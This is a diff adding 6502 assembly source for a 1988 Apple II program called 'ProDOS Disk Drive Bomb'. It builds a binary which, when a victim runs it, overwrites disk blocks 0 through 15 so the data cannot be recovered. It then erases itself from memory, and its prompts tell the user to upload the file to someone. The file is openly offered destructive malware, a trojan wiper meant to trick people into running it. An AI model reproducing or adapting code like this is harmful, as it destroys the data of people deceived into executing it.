@@ -1,0 +1,214 @@
+         ORG   $2000
+*
+*        => PRODOS DISK DRIVE BOMB V1.0 <=
+*
+*        V1.0 by -DC- on 04/07/88
+*
+* Description:
+*
+*   This program will allow the user to create a binary file
+* that will wipe out blocks 0-15, ensuring that all data on
+* these blocks are destroyed, and therefore making it impossible
+* to regain access to information on the disk.
+*   The purpose behind the program was to give the user power
+* to destroy data on someone's drive by getting them to execute
+* the binary file.
+*
+         JMP   START
+         JMP   BOMB
+START    LDA   #$00
+         STA   $22        ;Same as the TEXT command
+         JSR   $FC58      ;Clears the screen
+         JSR   SOUND
+         JSR   SOUND
+         LDX   #$00
+P1       LDA   DATA,X
+         CMP   #$80
+         BEQ   J1
+         INX
+         JSR   $FDED      ;Prints out character in A reg.
+         JMP   P1         ;Goes back to get next character
+J1       LDA   #$05       ;Loads A reg. with 5 to lock out
+         STA   $22        ;the top 5 lines of text.
+         LDX   #$00
+P2       LDA   DATA1,X    ;Displays "Input slot #" message
+         CMP   #$80
+         BEQ   J2
+         INX
+         JSR   $FDED
+         JMP   P2
+J2       JSR   $FD0C      ;Gets the slot # input from keyboard
+         CMP   #$B1
+         BMI   J2         ;Slot less than 1?  Yes, go back
+         CMP   #$B8
+         BPL   J2         ;Slot greater than 7?  Yep, go back
+         JSR   $FDED      ;And displays it
+         ASL              ;Shifts bits accordingly
+         ASL
+         ASL
+         ASL
+         STA   $4000      ;Stores input at $4000 (safe location)
+         LDX   #$00
+P3       LDA   DATA2,X    ;Displays "Enter drive #" message
+         CMP   #$80
+         BEQ   J3
+         INX
+         JSR   $FDED
+         JMP   P3
+J3       JSR   $FD0C      ;Gets drive # input
+         CMP   #$B1
+         BMI   J3         ;Is it drive 0?  Yep, go back
+         CMP   #$B3
+         BPL   J3         ;Is drive greater than 2?  Yep, go back
+         JSR   $FDED      ;And displays it
+         CMP   #$B1       ;Jump over following if
+         BEQ   J4         ;drive # is 1.
+         LDA   $4000      ;Sets up bits correctly so that
+         ORA   #$80       ;the first bit is always 1.
+         STA   $4000
+J4       LDA   $4000
+         STA   MARKER     ;Stores value at end of program
+         JSR   SOUND
+         JSR   SOUND
+         LDX   #$00
+P4       LDA   DATA3,X
+         CMP   #$80
+         BEQ   J5
+         INX
+         JSR   $FDED
+         JMP   P4
+J5       LDA   #$EA       ;Following will erase first 3 bytes
+         STA   $2000      ;of program so that it'll jump directly
+         STA   $2001      ;to the write routine when executed.
+         STA   $2002
+         RTS              ;End of program
+*
+*  The following sets up the data buffer for ProDOS
+*
+* The first routine checks to see if the file PROTECT is
+* on the current drive (the one it's being run from).
+* If so, abort (protect mechanism)
+*
+BOMB     LDX   #$00       ;The following will prefix to
+P6       LDA   DATA5,X    ;the correct drive #
+         STA   $200,X
+         INX
+         CPX   #$08       ;8 chars total
+         BEQ   PRE
+         JMP   P6
+PRE      LDA   $BF30      ;Load current drive #
+         CMP   #128
+         BPL   DRIVE2     ;Drive 2 active
+         LDA   #$B1
+         JMP   PRE1
+DRIVE2   LDA   #$B2
+PRE1     STA   $200,X
+         INX
+         LDA   #$8D
+         STA   $200,X
+         JSR   $BE03      ;Calls the 'BI' for PREFIX,D#
+         CMP   #$00       ;Error code return in A reg
+         BNE   ERROR2
+         LDA   #$02       ;Load parameter count
+         STA   $4000      ;Stores it
+         LDA   #$E1       ;L$ minus 9
+         STA   $4001      ;Low byte of filename buffer
+         STA   $4003
+         LDA   #$22
+         STA   $4002      ;Hi byte of filename buffer
+         STA   $4004
+         JSR   $BF00      ;MLI routine
+         hex   C20040     ;Function code, address of parms
+         BCC   SOUND      ;File found, abort program
+         CMP   #$46       ;File not found error code
+         BEQ   GO         ;Yes, destroy!!
+         JMP   ERROR      ;Other error occurred
+GO       LDA   MARKER     ;Loads last byte of program (unit #)
+         STA   $4001      ;Stores slot & drive info (unit #)
+         LDA   #$03       ;Loads parameter count
+         STA   $4000      ;Stores it at first byte
+         LDA   #$00       ;Low byte of data buffer ($4000)
+         STA   $4002      ;Stores it
+         LDA   #$40       ;Hi byte
+         STA   $4003      ;Stores it
+*
+*  The next routine will write through blocks 0-15
+*
+         LDX   #$00
+J6       STX   $4004      ;Stores low byte of block
+         LDA   #$00
+         STA   $4005      ;Hi byte of block
+         JSR   $BF00      ;Jumps to MLI routine
+         hex   810040     ;Function code, buffer address
+         BCS   ERROR      ;An error has occured
+         INX              ;Increments to next block
+         CPX   #$0F       ;Is it block 15 yet?
+         BNE   J6         ;Nope, go back and do next one
+         LDX   #$00
+         LDA   #$00       ;The following will wipe out the
+J7       STA   $2000,X    ;program so the victim can't bsave it
+         INX              ;and upload it to someone else.
+         CPX   #$BE       ;Don't erase this stuff, though!
+         BNE   J7
+         JMP   SOUND
+*
+*  Subroutines & Data
+*
+ERROR2   JSR   $BE0C      ;Jumps to error message routine
+         JMP   J9         ;The never ending loop
+SOUND    LDY   #$FF
+S1       LDA   $C030
+         LDA   #$01
+         JSR   $FCA8
+         LDA   #$03
+         JSR   $FCA8
+         DEY
+         CPY   #$00
+         BNE   S1
+         RTS
+*
+ERROR    TAY              ;Y registor now holds error code
+         LDX   #$00
+P5       LDA   DATA4,X
+         CMP   #$80
+         BEQ   J8
+         INX
+         JSR   $FDED
+         JMP   P5
+J8       TYA
+         JSR   $FDDA      ;Prints error code to screen
+J9       JMP   J9         ;Endless loop
+*
+DATA     ASC   "    "
+         HEX   1C20202020202020202020202020202020202020202020202020202020202F8D
+         HEX   1C2020201C
+         ASC   " ProDOS Disk Drive Bomb V1.0 "
+         HEX   2F202020202F20
+         ASC   " Written by -DC- "
+         HEX   2A         ;Prints an inverse star
+         ASC   " Call Shooting Star "
+         HEX   2020
+         ASC   " 20meg BBS/PAE ProDOS....206/838-7686 "
+         HEX   20
+         ASC   "----------------------------------------"
+         HEX   80
+DATA1    HEX   8D
+         ASC   "Enter slot # to wipe: "
+         HEX   80
+DATA2    HEX   8D
+         ASC   "       Enter drive #: "
+         HEX   80
+DATA3    HEX   8D8D
+         ASC   "       -%> Bomb has been made! <%-"
+         HEX   8D8D
+         ASC   "Type 'BSAVE <filename>,A$2000,L$2EA'"
+         HEX   8D
+         ASC   "And then upload the file to the guy!"
+         HEX   8D8D80
+DATA4    HEX   87
+         ASC   "ProDOS MLI Error $"
+         HEX   80
+DATA5    ASC   "PREFIX,D"
+BUF1     HEX   07
+         ASC   "PROTECT"
+MARKER   HEX   88         ;A data byte marker for slot & drive
